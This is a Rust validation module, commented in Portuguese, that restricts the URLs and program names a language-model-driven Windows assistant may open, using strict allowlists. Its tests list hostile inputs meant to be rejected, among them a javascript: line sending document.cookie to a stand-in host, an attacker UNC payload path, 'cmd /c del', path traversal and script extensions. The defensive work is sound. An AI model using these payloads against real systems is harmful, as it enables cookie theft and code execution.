//! A fronteira de confiança do módulo.
//!
//! Tudo que chega aqui foi escrito por um modelo de linguagem a partir de fala ou
//! digitação — não é escolha de menu. Um "abre o site X" mal interpretado não pode
//! virar `file:///C:/`, `javascript:` ou um caminho de rede.
//!
//! A regra é sempre ALLOWLIST, nunca lista negra: o conjunto do que é permitido é
//! pequeno e conhecido, e o do que é perigoso não para de crescer — um esquema novo
//! do Windows já nasce bloqueado aqui sem ninguém precisar lembrar dele.

use url::Url;

use super::SystemError;

/// Teto generoso: nenhuma alucinação do modelo precisa virar uma string gigante.
const LIMITE_URL: usize = 2048;
const LIMITE_NOME: usize = 64;

/// Normaliza e valida um endereço de site.
///
/// Aceita tanto `youtube.com` quanto `https://youtube.com` — o modelo alterna entre
/// os dois o tempo todo, e exigir o esquema transformaria um acerto em erro.
pub fn site(raw: &str) -> Result<Url, SystemError> {
    let texto = raw.trim();
    let recusa = || SystemError::UrlInvalida(raw.chars().take(80).collect());

    if texto.is_empty() || texto.len() > LIMITE_URL {
        return Err(recusa());
    }

    // Caractere de controle inclui o NUL, e NUL é o caso perigoso: o `PCWSTR` que vai
    // para o Windows termina no primeiro zero, então um NUL no meio faria o log e a
    // mensagem ao usuário mostrarem uma coisa e o sistema abrir outra.
    //
    // Barra invertida some junto: em esquema especial o padrão de URL trata `\` como
    // `/`, então `\\servidor\share` viraria um endereço de aparência inofensiva.
    if texto.chars().any(char::is_control) || texto.contains('\\') {
        return Err(recusa());
    }

    let url = match Url::parse(texto) {
        Ok(url) => url,
        // Sem esquema o parse falha como "relativo sem base" — é o caso comum
        // (`youtube.com`), e https é o padrão certo hoje.
        Err(url::ParseError::RelativeUrlWithoutBase) => {
            Url::parse(&format!("https://{texto}")).map_err(|_| recusa())?
        }
        Err(_) => return Err(recusa()),
    };

    // A allowlist. Derruba file:, javascript:, data:, shell:, ms-settings:, search-ms:
    // e todo o resto de uma vez.
    if !matches!(url.scheme(), "http" | "https") {
        return Err(SystemError::UrlInvalida(raw.chars().take(80).collect()));
    }
    if url.host_str().unwrap_or_default().is_empty() {
        return Err(recusa());
    }

    Ok(url)
}

/// Valida um nome de programa "puro" — é o que deixa o Windows resolver PATH e
/// `App Paths`, e é o que impede o modelo de mandar executar um caminho.
pub fn app(raw: &str) -> Result<String, SystemError> {
    let nome = raw.trim();
    let recusa = || SystemError::ProgramaInvalido(raw.chars().take(80).collect());

    if nome.is_empty() || nome.len() > LIMITE_NOME {
        return Err(recusa());
    }

    // Allowlist de caracteres. Derruba de uma vez caminho (`\` `/`), unidade e
    // esquema (`:`), expansão de variável (`%`), argumento (espaço), aspas e `..`.
    //
    // Espaço fica de fora de propósito: entrada de `App Paths` é sempre nome de
    // executável (`Code.exe`, `spotify.exe`), nunca "Visual Studio Code". Não se
    // perde capacidade e some a classe "nome + argumento".
    if !nome
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '+' | '-'))
    {
        return Err(recusa());
    }

    // Extensão: `.exe` ou nenhuma. O `ShellExecuteW` executaria `.bat`, `.cmd`,
    // `.ps1`, `.vbs`, `.js` e `.lnk` de bom grado — e é exatamente por onde um
    // "abre o instalador.bat" alucinado viraria execução de script.
    match nome.rsplit_once('.') {
        Some((base, ext)) if !base.is_empty() && ext.eq_ignore_ascii_case("exe") => {}
        Some(_) => return Err(recusa()),
        None => {}
    }

    Ok(nome.to_owned())
}

/// Monta a busca no Google. O percent-encode sai correto de graça — acento, espaço e
/// `&` inclusive, que é o que impede a fala do usuário de escapar da query e virar um
/// segundo parâmetro.
pub fn search_url(query: &str) -> Result<Url, SystemError> {
    let termo = query.trim();
    if termo.is_empty() || termo.len() > LIMITE_URL {
        return Err(SystemError::BuscaVazia);
    }

    Url::parse_with_params("https://www.google.com/search", [("q", termo)])
        .map_err(|_| SystemError::BuscaVazia)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// O teste que importa: o que um modelo alucinando NÃO pode conseguir abrir.
    #[test]
    fn so_deixa_passar_http_e_https() {
        let hostis = [
            "file:///C:/Windows/System32/calc.exe",
            "javascript:fetch('http://x/'+document.cookie)",
            "data:text/html,<script>alert(1)</script>",
            r"\\servidor-do-atacante\compartilhamento\payload.exe",
            "ms-settings:privacy",
            "shell:startup",
            "search-ms:query=senha",
            "http://exemplo.com\u{0}javascript:alert(1)",
            "",
            "   ",
        ];

        for entrada in hostis {
            assert!(site(entrada).is_err(), "passou pela validação: {entrada:?}");
        }
    }

    #[test]
    fn aceita_site_com_e_sem_esquema() {
        assert_eq!(
            site("youtube.com").expect("válido").as_str(),
            "https://youtube.com/"
        );
        assert_eq!(
            site("https://x.com").expect("válido").as_str(),
            "https://x.com/"
        );
        // http continua valendo: existe intranet e roteador sem TLS.
        assert_eq!(
            site("http://192.168.0.1").expect("válido").as_str(),
            "http://192.168.0.1/"
        );
    }

    #[test]
    fn nome_de_programa_nao_pode_virar_caminho_nem_script() {
        let hostis = [
            r"..\..\Users\gui\Downloads\payload",
            r"C:\Windows\System32\cmd.exe",
            "/bin/sh",
            "cmd /c del",
            "notepad\u{0}",
            "instalador.bat",
            "coisa.ps1",
            "x.vbs",
            "atalho.lnk",
            "%APPDATA%",
            "spotify\"",
            "",
        ];

        for entrada in hostis {
            assert!(app(entrada).is_err(), "passou pela validação: {entrada:?}");
        }
    }

    #[test]
    fn aceita_nome_simples_de_programa() {
        for legitimo in ["notepad", "spotify", "chrome.exe", "Code", "vlc", "7zFM"] {
            assert_eq!(app(legitimo).expect("válido"), legitimo);
        }
        assert_eq!(app("  notepad.exe  ").expect("válido"), "notepad.exe");
    }

    /// Acento e `&` são o caso real: "preço do dólar & juros" quebra tudo que
    /// concatena string à mão.
    #[test]
    fn a_busca_nao_deixa_a_fala_escapar_da_query() {
        let url = search_url("preço do dólar & juros").expect("válida");

        assert_eq!(url.host_str(), Some("www.google.com"));
        assert_eq!(url.path(), "/search");
        assert_eq!(
            url.query_pairs()
                .next()
                .map(|(chave, valor)| (chave.into_owned(), valor.into_owned())),
            Some(("q".to_owned(), "preço do dólar & juros".to_owned()))
        );

        assert!(search_url("   ").is_err());
    }
}
